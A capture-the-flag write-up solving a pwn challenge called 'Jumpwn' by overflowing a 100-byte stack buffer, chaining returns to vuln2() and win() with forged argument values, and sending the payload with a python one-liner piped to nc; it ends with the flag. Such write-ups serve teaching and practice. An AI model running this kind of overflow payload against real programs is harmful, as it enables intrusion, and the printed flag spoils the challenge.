# Jumpwn
* **Category:** Pwn
* **Points:** 500
## Problem

everyone wants to be a frob, right?

`nc challenges.ctfd.io 30063`

## Solution

This is a slightly more complicated buffer overflow challenge. In this challenge, we will need to jump around to a couple different functions (`vuln2()` and `win()`), as well as pass some variable/argument checks.

At the very top, we define a few global variables.
```
int global_var = 0xbaaaaaad;
int global_var2 = 0x12345678;
int global_var3 = 0xeeeeeeee;
```
In the `flag()` function, we use these variables to perform the following checks before printing the flag:
```
if (global_var == 0xfee15bad && global_var2 == 0xbeefd00d && !!global_var3 && arg2 == 0xc0cac01a) {	
	printf(buf);
}
```
So, in order for us to correctly print the flag, the global variables must pass these checks.

Next, in `main()`, we first call `vuln1()`:
```c
void vuln1 () {
	int var = 0xdeadbeef;
	
	puts("boing boing boing am bluefrogsay give me something to say: ");
	char buf[100];
	read(0, buf, 0x100);

	global_var = var;
	
	printf("here is what i say: %s", buf);
}
```
The `read` line is the part of the code that makes this vulnerable to a buffer overflow. The buffer variable created has space for 100 characters, but we read in `0x100` or 256 characters. This allows us to overwrite other memory on the stack.

We also see that we defined a variable `var` set to `0xdeadbeef` and then set `global_var` to this value. However, we need `global_var` to be `0xfee15bad` in order to pass the variable check, so we'll need to overwrite it with the correct value as well as jumping to the next function.

We will use gdb to find offsets and things in the same way as in overflowo. We get the following info:
```
Offset: 116
Address of vuln2: 0x08048679
Address of win: 0x080485db
```
The offset is composed of 100 bytes of buffer variable, 4 bytes for `var`, and 12 bytes of garbage. Thus, so far, our payload should be:
```sh
'A'*100 + '\xad\x5b\xe1\xfe' + 'A'*12 + '\x79\x86\x04\x08'
```
That will bring us to `vuln2()`:
```c
void vuln2 (int arg) {
	puts("kinda? keep going.");
  	
	int var2 = 0xc0715bad;
	
	global_var2 = arg;
	global_var3 = var2;
	
}
```
From there, we want to jump to the win function:
```c
void win (int arg2) {
	puts("you're in the win function!");
	char buf[64];
	FILE *f = fopen("flag.txt","r");
	if (f == NULL) {
		printf("Flag file is missing! You might be running this locally. If this occurs on the remote server, please ping admins.\n");
		exit(0);
	}

  	fgets(buf,64,f);
	
	if (global_var == 0xfee15bad && global_var2 == 0xbeefd00d && !!global_var3 && arg2 == 0xc0cac01a) {	
		printf(buf);
	}
	
}
```
This time, we need to overwrite the argument and the return address. However, on the stack, the return address for `vuln2()` will be before the argument. So, we should first overwrite the return address with the address of `win()`, then supply the correct value of `global_var2` for the argument. After examining the stack, we realize `var2` has disappeared into thin air. After jumping to `win()`, we need to overwrite the argument.
```
'A'*100 + '\xad\x5b\xe1\xfe' + 'A'*12 + '\x79\x86\x04\x08' + '\xdb\x85\x04\x08' + '\x0d\xd0\xef\xbe' + '\x1a\xc0\xca\xc0'
```
The 

```sh
python -c "print('A'*100 + '\xad\x5b\xe1\xfe' + 'A'*12 + '\x79\x86\x04\x08' + '\xdb\x85\x04\x08' + '\x0d\xd0\xef\xbe' + '\x1a\xc0\xca\xc0')" | nc challenges.ctfd.io 30063
```

Basically:

| buf | var1 | garbage | vuln2 addr | win addr | arg | arg2 | 
|---|---|---|---|---|---|---|
|100|4|12|4|4|4|4|

Flag: `cctf{n0w_y0u_4r3_a_7ru3_fr0b}`
